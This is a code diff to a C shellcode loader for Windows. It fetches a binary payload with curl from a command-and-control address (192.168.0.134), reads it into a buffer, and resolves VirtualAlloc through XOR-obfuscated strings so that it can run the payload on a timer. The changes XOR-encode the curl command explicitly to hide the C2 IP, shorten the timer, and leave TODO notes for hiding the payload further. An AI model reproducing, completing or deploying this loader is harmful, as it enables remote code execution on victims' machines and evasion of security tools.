@@ -24,7 +24,8 @@ int main(void)
 	unsigned char procName[] = "\x25\x1a\x01\x07\x06\x12\x1f\x32\x1f\x1f\x1c\x10\x73";
 	unsigned char kernel[] = "\x18\x16\x01\x1d\x16\x1f\x40\x41\x5d\x17\x1f\x1f\x73";
 	// Pointer to command
-	char * command = "curl http://192.168.0.134/code.bin";
+	// XOR this command to prevent identification of command and control ip
+	char * command = "\x10\x06\x01\x1f\x53\x1b\x07\x07\x03\x49\x5c\x5c\x42\x4a\x41\x5d\x42\x45\x4b\x5d\x43\x5d\x42\x40\x47\x5c\x10\x1c\x17\x16\x5d\x11\x1a\x1d\x73";
 	// Buffer to store the shellcode piped from command.
 	unsigned char shellcode[460];
 	// Buffer to store one byte piped from command to shellcode buffer
@@ -34,12 +35,14 @@ int main(void)
 	FILE * fpipe;
 
 	// Check to see if results of command have failed to be piped to file storage
+	// STILL NEED TO IMPLEMENT DE_XOR TO DECRYPT COMMAND 
+	// ALso encapsulate this in the timer callback function otherwise it just has payload sitting until timer executes
 	if(NULL == (fpipe = (FILE *)popen(command, "r")))
 	{
 		printf("Failed to pipe!");
 		return 1;
 	}
-
+	
 	while (fread(&byte, sizeof(byte), 1, fpipe))
 	{
 		shellcode[counter] = byte;
@@ -54,7 +57,7 @@ int main(void)
 	pAllocate = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle(de_xor(kernel, sizeof(kernel), key)), de_xor(procName, sizeof(procName), key));
 
 
-	UINT_PTR timerId = SetTimer(NULL, 1, 600000, TimerProc);
+	UINT_PTR timerId = SetTimer(NULL, 1, 60000, TimerProc);
 
 	MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
